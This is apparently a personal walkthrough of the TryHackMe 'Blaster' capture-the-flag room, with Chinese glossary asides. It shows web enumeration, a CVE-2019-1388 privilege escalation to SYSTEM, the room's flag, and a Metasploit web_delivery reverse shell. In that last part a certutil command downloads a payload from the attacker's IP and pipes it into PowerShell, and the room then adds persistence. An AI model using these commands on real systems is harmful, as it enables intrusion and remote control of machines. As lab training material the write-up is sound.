# Blaster
A blast from the past!

Kali Linux : 10.18.72.222

Target IP Address : 10.10.189.103

## Task 1 Mission Start!
wrap up: 结束或完成某件事情。

pivoting back to: 这个文本的意思是重新转向或回到之前的主题或计划中。在计算机科学中，"pivoting"是指在数据处理或分析中，改变或旋转数据的结构或方向，以便更好地进行分析或展示。在商业领域中，"pivoting"也可以指公司或企业从原有的商业模式或战略转向新的商业模式或战略。

Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster. To wrap up the room, we'll be pivoting back to these tools for persistence and additional steps we can take. Without further delay, let's deploy our target machine!

This room is a remix of my previous room Retro with some complications I added to that room having been removed. For increased difficulty and an exercise in patience, check that room out after this. In addition, this room is the sequel to Ice. - DarkStar7471

Deploy the machine! This is a Windows box so give it a few minutes (3-5 at max) to come online

## Task 2: Activate Forward Scanners and Launch Proton Torpedoes
Now that we've launched our target, let's perform some basic enumeration of the services running on it!

```

Looks like there's a web server running, what is the title of the page we discover when browsing to it?

http://10.10.189.103/

IIS Windows Server

Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

[Dirbuster](https://www.kali.org/tools/dirbuster/#:~:text=DirBuster%20is%20a%20multi%20threaded,names%20on%20web%2Fapplication%20servers.)

Target URL: http://10.10.189.103/

Number Of Threads: Go Faster

Select scanning type: List based brute force

Navigate to our discovered hidden directory, what potential username do we discover?

http://10.10.189.103/retro/

Wade

Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

## Task 3: Breaching the Control Room
Now that we've gained access to our target system, let's see if we can find a way to escalate. To start, let's scout around the system to see if we can find anything of interest.

When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

CVE-2019-1388

Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html

Requirement:

Windows 7

Windows 10 LTSC 10240

Failing on :

Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege

[Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

hhupd

Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

![cve-2019-1388.png](/img/in-post/tryhackme/cve-2019-1388.png)

Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

nt authority\system

Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

```
C:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt
THM{CON_OPERATED_EXPLOITATION}
```

## Task 4: Adoption into the Collective
Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.

Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

```
┌──(root㉿kali)-[~]
└─# msfconsole -q

```

First, let's set the target to PSH (PowerShell). Which target number is PSH?

Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.

```

```

Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. 

save the above command as web_delivery.txt under ~/Downloads

```
┌──(root㉿kali)-[~/Downloads]
└─# python -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

You can use the `certutil` utility in Windows Command Prompt to download files over HTTP. Here's the command you can use to download the `web_delivery.txt` file from `http://10.18.72.222/`:

```
certutil -urlcache -split -f http://10.18.72.222/web_delivery.txt
```

Let's break down the options used in the command:

- `-urlcache`: Specifies that you want to download a file from a URL.
- `-split`: Splits the downloaded file into smaller chunks while downloading. This option is useful for large files.
- `-f`: Forces the download, even if the file already exists in the cache.

After running the command, the `web_delivery.txt` file will be downloaded and stored in the Windows cache. You can find the file in the cache, typically located at `%USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache`.

Keep in mind that this method is suitable for downloading files from non-secure HTTP sources. If you need to download files over HTTPS or require more advanced options, consider using tools like `curl` or `wget`, which offer greater flexibility and support for secure connections.

```

```

To run a PowerShell command stored in a text file using Command Prompt (CMD) in Windows, you can use the `powershell` command followed by the `Get-Content` cmdlet. The `Get-Content` cmdlet reads the content of the text file and passes it as input to the PowerShell interpreter. Here's how you can do it:

1. Create a text file (let's say `commands.txt`) and add your PowerShell command(s) in it. Each command should be on a separate line.

   For example, the contents of `commands.txt` might look like this:
   ```
   Get-Process
   Get-Service
   ```

2. Open Command Prompt (CMD).

3. Use the following command to run the PowerShell commands from the text file:

   ```
   powershell Get-Content -Path "C:\path\to\commands.txt" | powershell -
   ```

   Replace `"C:\path\to\commands.txt"` with the actual path to your text file.

   The `Get-Content` cmdlet reads the contents of the file, and the pipe (`|`) sends the output to the next PowerShell instance (`powershell -`), which then executes the commands.

Keep in mind that the PowerShell commands in the text file will be executed sequentially, one after the other. If you have multiple commands in the file, they will be executed in the order they appear in the file.

Also, ensure that you have the necessary permissions to execute PowerShell commands and access the text file. If the commands require elevated privileges, you may need to run CMD or PowerShell as an administrator.

```
powershell Get-Content -Path "web_delivery.txt" | powershell -
```

[-] Error running command reboot: Rex::TimeoutError Send timed out

```

Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
